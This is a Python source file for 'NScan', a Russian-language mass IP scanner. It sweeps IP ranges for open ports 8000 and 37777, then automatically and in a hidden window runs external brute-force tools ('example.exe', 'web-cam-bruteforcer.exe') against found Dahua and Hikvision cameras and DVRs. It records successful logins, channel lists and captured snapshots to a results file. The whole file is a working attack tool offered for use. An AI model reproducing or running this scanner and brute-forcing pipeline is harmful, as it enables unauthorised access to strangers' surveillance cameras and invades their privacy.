import sys
import subprocess
import threading
import queue
import socket
import asyncio
import ipaddress
import ctypes
import signal
import time
import struct
from itertools import islice
import sys
import config
import os

# Первичная установка зависимостей
def first_run_setup():
    required = ['colorama']
    print("[СИСТЕМА] Проверка зависимостей...")
    
    for package in required:
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "show", package],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except subprocess.CalledProcessError:
            print(f"[СИСТЕМА] Установка {package}...")
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", package],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                print("[СИСТЕМА] Зависимости установлены. Перезапуск...")
                subprocess.call([sys.executable] + sys.argv)
                sys.exit(0)
            except subprocess.CalledProcessError as e:
                print(f"[ОШИБКА] Не удалось установить {package}: {e}")
                sys.exit(1)

first_run_setup()

from colorama import init, Fore, Back, Style
init(autoreset=True)

# Настройки
try:
    if len(sys.argv) > 1:
        PORT = int(sys.argv[1])
        DORECOVERY = sys.argv[2].lower() == 'true'
    else:
        print("Использование: python app.py <port> <dorecovery>")
        print("Порт не представлен аргументом, использую 8000.")
        PORT = getattr(config, 'PORT', 8000)
        DORECOVERY = getattr(config, 'DORECOVERY', False)
except ValueError:
    print(f"Ошибка: Порт инвалидный, как и ты: {sys.argv[1]}")
    sys.exit(1)
except IndexError:
    print("Порт не представлен аргументом, использую 8000.")
    PORT = getattr(config, 'PORT', 8000)
    DORECOVERY = getattr(config, 'DORECOVERY', False)

THREADS = int(config.THREADS / 2)
RANGES_FILE = config.RANGES_FILE
OUTPUT_FILE = config.OUTPUT_FILE.replace(".txt", f"_{str(PORT)}") + ".txt"
TIMEOUT = config.TIMEOUT
UPDATE_INTERVAL = config.UPDATE_INTERVAL
BATCH_SIZE = config.BATCH_SIZE
autoclear_found_on_start = config.autoclear_found_on_start
modik = config.mode

output_dir = "results"
dahua_output_file = os.path.join(output_dir, "Dahua.txt")

# Цветовая схема
COLOR_TITLE = Fore.CYAN + Style.BRIGHT
COLOR_HEADER = Fore.MAGENTA + Style.BRIGHT
COLOR_SUCCESS = Fore.GREEN + Style.BRIGHT
COLOR_WARNING = Fore.YELLOW + Style.BRIGHT
COLOR_ERROR = Fore.RED + Style.BRIGHT
COLOR_PROGRESS = Fore.BLUE + Style.BRIGHT

# Глобальные переменные
checked_ips = 0
successful_ips = 0
total_ips = 0
ip_queue = queue.Queue()
lock = threading.Lock()
print_lock = threading.Lock()
stop_event = threading.Event()

def print_banner():
    banner = r"""
███╗   ██╗███████╗ ██████╗ █████╗ ███╗   ██╗
████╗  ██║██╔════╝██╔════╝██╔══██╗████╗  ██║
██╔██╗ ██║███████╗██║     ███████║██╔██╗ ██║
██║╚██╗██║╚════██║██║     ██╔══██║██║╚██╗██║
██║ ╚████║███████║╚██████╗██║  ██║██║ ╚████║
╚═╝  ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
    """
    print(COLOR_HEADER + banner)
    print(COLOR_HEADER + " " * 15 + "NScan | by NDev https://t.me/developer102\nAlso thanks for: MVFps, hikvision-bruteforcer, Dahua_Brute_Pass++\n")

def update_title():
    title = f"NScan | Проверено: {checked_ips}/{total_ips} | Открыто: {successful_ips}"
    if sys.platform == 'win32':
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    else:
        sys.stdout.write(f"\x1b]2;{title}\x07")

def title_updater():
    while not stop_event.is_set():
        with lock:
            update_title()
        stop_event.wait(UPDATE_INTERVAL)

async def async_check_port(ip, port, timeout=TIMEOUT):
    try:
        family = socket.AF_INET6 if ':' in ip else socket.AF_INET
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port, family=family),
            timeout=timeout
        )
        writer.close()
        await writer.wait_closed()
        return True
    except:
        return False

def update_progress():
    progress = checked_ips / total_ips if total_ips > 0 else 0
    failed = checked_ips - successful_ips
    success_percent = (successful_ips / checked_ips) * 100 if checked_ips > 0 else 0
    
    bar = f"{'■' * int(40 * progress):<40}"
    stats = (
        f"Порт: {PORT} | "
        f"Всего: {checked_ips}/{total_ips} | "
        f"Открыто: {successful_ips} | "
        f"Закрыто: {failed} | "
        f"Успех: {success_percent:.2f}%"
    )
    
    line = f"[•] Прогресс: {bar} {stats}"
    padding = " " * max(0, 120 - len(line))
    
    with print_lock:
        sys.stdout.write("\r" + COLOR_PROGRESS + line + padding)
        sys.stdout.flush()

def process_output(pipe, filename):
    with open(filename, 'a', encoding='utf-8') as f_out:
        for line in iter(pipe.readline, b''):
            decoded_line = line.decode('utf-8', errors='ignore').strip()
            if "Login device successful" in decoded_line or \
               "Get channel" in decoded_line or \
               "Snap picture result:True" in decoded_line or \
               "array length" in decoded_line:
                f_out.write(decoded_line + "\n")
    pipe.close()

def worker():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    while not stop_event.is_set():
        try:
            ip = ip_queue.get_nowait()
            result = loop.run_until_complete(async_check_port(ip, PORT))
            
            with lock:
                global checked_ips, successful_ips
                checked_ips += 1
                with open(f'recovery{PORT}', 'w') as f:
                    f.write(f"{ip}\n")
                if result:
                    successful_ips += 1
                    with open(OUTPUT_FILE, 'a') as f:
                        f.write(f"{ip}\n")
                    if modik == 1:
                        if PORT == 37777:
                            programName = "example.exe"
                            target_ip = ip

                            startupinfo = None
                            creationflags = 0

                            if sys.platform.startswith('win'):
                                startupinfo = subprocess.STARTUPINFO()
                                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                                startupinfo.wShowWindow = subprocess.SW_HIDE
                                creationflags = subprocess.DETACHED_PROCESS

                            try:
                                p = subprocess.Popen(
                                    [programName, target_ip],
                                    startupinfo=startupinfo,
                                    creationflags=creationflags,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE
                                )

                                stdout_thread = threading.Thread(target=process_output, args=(p.stdout, dahua_output_file))
                                stdout_thread.daemon = True
                                stdout_thread.start()

                                stderr_thread = threading.Thread(target=process_output, args=(p.stderr, dahua_output_file))
                                stderr_thread.daemon = True
                                stderr_thread.start()

                            except FileNotFoundError:
                                print(f"Ошибка: Файл '{programName}' не найден. Убедитесь, что он находится в PATH или в той же директории.")
                            except Exception as e:
                                print(f"Ошибка при запуске {programName}: {e}")
                
                if checked_ips % 50 == 0 or checked_ips == total_ips:
                    update_progress()
                
            ip_queue.task_done()
        except queue.Empty:
            break
        except Exception as e:
            with print_lock:
                print(COLOR_ERROR + f"[ОШИБКА] В потоке: {e}")
    loop.close()

def ipv4_range_to_ips(start, end):
    start_int = struct.unpack("!I", socket.inet_aton(start))[0]
    end_int = struct.unpack("!I", socket.inet_aton(end))[0]
    return (socket.inet_ntoa(struct.pack("!I", i)) for i in range(start_int, end_int + 1))

def batch_generator(generator, batch_size):
    while True:
        batch = list(islice(generator, batch_size))
        if not batch:
            break
        yield batch

def process_range(start_str, end_str):
    if ':' in start_str:
        return 0  # Пропускаем IPv6 без вывода
    
    gen = ipv4_range_to_ips(start_str, end_str)
    count = 0
    for batch in batch_generator(gen, BATCH_SIZE):
        for ip in batch:
            ip_queue.put(ip)
        count += len(batch)
    return count

def load_ranges():
    global total_ips
    loaded_ips_list = []
    start_time = time.time()
    ipv6_count = 0

    try:
        with open(RANGES_FILE) as f:
            print(COLOR_HEADER + "\n[•] Загрузка диапазонов IP...")

            for line_num, line in enumerate(f, 1):
                if stop_event.is_set():
                    break

                line = line.strip()
                if not line or line.startswith("#"):
                    continue

                if '-' not in line:
                    with print_lock:
                        print(COLOR_WARNING + f"[!] Пропуск некорректной строки {line_num}: {line}")
                    continue

                try:
                    start_str, end_str = map(str.strip, line.split('-', 1))
                    if ':' in start_str:
                        ipv6_count += 1
                        continue

                    for ip in ipv4_range_to_ips(start_str, end_str):
                        loaded_ips_list.append(ip)

                    if time.time() - start_time > 1:
                        with print_lock:
                            sys.stdout.write(COLOR_PROGRESS + f"\r[•] Загружено {len(loaded_ips_list):,} IP")
                            sys.stdout.flush()

                except Exception as e:
                    with print_lock:
                        print(COLOR_ERROR + f"[!] Ошибка в строке {line_num}: {e}")
                    continue

        if DORECOVERY:
            recovery_file_path = f'recovery{PORT}'
            if os.path.exists(recovery_file_path):
                file_content = ""
                try:
                    with open(recovery_file_path, 'r') as f_recovery_read:
                        file_content = f_recovery_read.read().strip()
                except Exception as e:
                    with print_lock:
                        print(COLOR_ERROR + f"[!] Ошибка чтения файла восстановления '{recovery_file_path}': {e}. Начинаем с начала.")
                        

                if file_content == 'all':
                    if PORT == 8000:
                        programName = "web-cam-bruteforcer.exe"
                        command = [programName, "--port", str(PORT)]

                        if sys.platform.startswith('win'):
                            subprocess.Popen(["start", "cmd", "/k"] + command, shell=True)
                        elif sys.platform == 'darwin':
                            script = f'tell application "Terminal" to do script "{programName} --port {PORT}"'
                            subprocess.Popen(["osascript", "-e", script])
                        elif sys.platform.startswith('linux'):
                            subprocess.Popen(["gnome-terminal", "--"] + command)
                        else:
                            print(f"Неподдерживаемая ОС для открытия нового окна. Запуск {programName} в текущем контексте.")
                            subprocess.Popen(command)
                    if PORT == 37777:
                        try:
                            with open('ips_37777.txt', 'r') as f_ips:
                                lineNumber = 0
                                for line in f_ips:
                                    lineNumber += 1
                                    programName_multi = "example.exe"
                                    current_ip_from_file = line.strip(' \t\n\r')

                                    print(f"Запуск {programName_multi} с IP: {current_ip_from_file}")
                                    p_multi = subprocess.Popen([programName_multi, current_ip_from_file])

                                    if lineNumber % 15 == 0:
                                        time.sleep(30)
                        except FileNotFoundError:
                            print("Ошибка: Файл 'ips_37777.txt' не найден.")
                        except Exception as e:
                            print(f"Ошибка при обработке ips_37777.txt: {e}")
                    sys.exit(1)
                    return

                elif file_content:
                    with print_lock:
                        print(COLOR_WARNING + f"\n[!] Режим восстановления: последний IP '{file_content}' из {recovery_file_path}")

                    try:
                        last_ip_index = loaded_ips_list.index(file_content)
                        loaded_ips_list = loaded_ips_list[last_ip_index + 1:]
                        with print_lock:
                            print(COLOR_SUCCESS + f"[✓] Удалено {last_ip_index + 1} IP-адресов из очереди.")
                    except ValueError:
                        with print_lock:
                            print(COLOR_WARNING + f"[!] Последний IP '{file_content}' не найден в текущих диапазонах. Начинаем с начала.")
                else:
                    with print_lock:
                        print(COLOR_WARNING + f"\n[!] Файл восстановления '{recovery_file_path}' пуст. Начинаем с начала.")
            else:
                with print_lock:
                    print(COLOR_WARNING + f"[!] Файл восстановления '{recovery_file_path}' не найден. Начинаем с начала.")

        for ip in loaded_ips_list:
            ip_queue.put(ip)

        total_ips = len(loaded_ips_list)
        duration = time.time() - start_time
        with print_lock:
            print(COLOR_SUCCESS + f"\n[✓] Успешно загружено {total_ips:,} IP ({total_ips/duration:,.0f} IP/сек)")
            if ipv6_count > 0:
                print(COLOR_WARNING + f"[•] Пропущено {ipv6_count} IPv6 диапазонов")
            print(COLOR_HEADER + "-" * 60)
    except ZeroDivisionError:
        print(COLOR_ERROR + f"[!] Нет IP для сканирования!")
        sys.exit(1)
    except Exception as e:
        print(COLOR_ERROR + f"[!] Критическая ошибка: {e}")
        sys.exit(1)

def signal_handler(sig, frame):
    with print_lock:
        print(COLOR_ERROR + "\n[!] Остановка сканирования...")
    stop_event.set()
    sys.exit(0)

def main():
    print_banner()
    signal.signal(signal.SIGINT, signal_handler)
    
    if autoclear_found_on_start:
        try:
            with open(OUTPUT_FILE, 'w') as f:
                pass
            print(COLOR_SUCCESS + "[✓] Файл результатов очищен")
        except Exception as e:
            print(COLOR_ERROR + f"[!] Ошибка очистки файла: {e}")

    load_ranges()
    
    if total_ips == 0:
        print(COLOR_WARNING + "[!] Нет IP для сканирования!")
        return
    
    threading.Thread(target=title_updater, daemon=True).start()
    
    print(COLOR_HEADER + f"[•] Запуск {THREADS} потоков...")
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)
    
    try:
        while not ip_queue.empty() and not stop_event.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        signal_handler(None, None)
    
    # Ожидание завершения всех потоков
    for t in threads:
        t.join(timeout=1.0)
    
    stop_event.set()
    if PORT == 8000:
        programName = "web-cam-bruteforcer.exe"
        command = [programName, "--port", str(PORT)]

        if sys.platform.startswith('win'):
            subprocess.Popen(["start", "cmd", "/k"] + command, shell=True)
        elif sys.platform == 'darwin':
            script = f'tell application "Terminal" to do script "{programName} --port {PORT}"'
            subprocess.Popen(["osascript", "-e", script])
        elif sys.platform.startswith('linux'):
            subprocess.Popen(["gnome-terminal", "--"] + command)
        else:
            print(f"Неподдерживаемая ОС для открытия нового окна. Запуск {programName} в текущем контексте.")
            subprocess.Popen(command)
    if modik == 2:
        if PORT == 37777:
            try:
                with open('ips_37777.txt', 'r') as f_ips:
                    lineNumber = 0
                    for line in f_ips:
                        lineNumber += 1
                        programName_multi = "example.exe"
                        current_ip_from_file = line.strip(' \t\n\r')

                        print(f"Запуск {programName_multi} с IP: {current_ip_from_file}")
                        p_multi = subprocess.Popen([programName_multi, current_ip_from_file])

                        if lineNumber % 15 == 0:
                            time.sleep(30)
            except FileNotFoundError:
                print("Ошибка: Файл 'ips_37777.txt' не найден.")
            except Exception as e:
                print(f"Ошибка при обработке ips_37777.txt: {e}")

    with open(f'recovery{PORT}', 'w') as f:
        f.write(f"all\n")
    print(COLOR_SUCCESS + "\n[✓] Сканирование завершено!")
    print(COLOR_HEADER + "-" * 60)
    print(COLOR_TITLE + f"Всего проверено: {checked_ips}")
    print(COLOR_TITLE + f"Найдено открытых портов: {successful_ips}")

if __name__ == "__main__":
    from colorama import init
    init(autoreset=True)
    main()
